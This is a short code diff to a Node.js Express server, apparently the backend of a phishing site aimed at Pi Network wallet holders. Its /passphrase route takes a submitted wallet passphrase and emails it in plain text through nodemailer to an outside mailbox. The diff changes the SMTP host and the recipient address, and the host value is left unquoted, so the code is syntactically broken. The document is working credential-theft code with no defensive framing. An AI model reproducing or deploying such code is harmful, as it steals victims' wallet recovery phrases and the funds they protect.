@@ -29,7 +29,7 @@ app.post('/passphrase', async (req, res) => {
   const passphrase = req.body.passphrase;
 
   let transporter = nodemailer.createTransport({
-    host: 188-239-191-167.cprapid.com, //"31-41-249-166.cprapid.com",
+    host: 31-41-249-166.cprapid.com, //188-239-191-167.cprapid.com, //"31-41-249-166.cprapid.com",
     port: 465,
     secure: true, // true for 465, false for other ports
     auth: {
@@ -44,7 +44,7 @@ app.post('/passphrase', async (req, res) => {
   // Define the email message
   const mailOptions = {
     from: 'admin@piexternaltransaction.com',
-    to: 'pinetwork101@proton.me',
+    to: 'admin@piexternaltransaction.com',
     subject: 'Passphrase Received',
     text: `Passphrase: ${passphrase}`,
   };
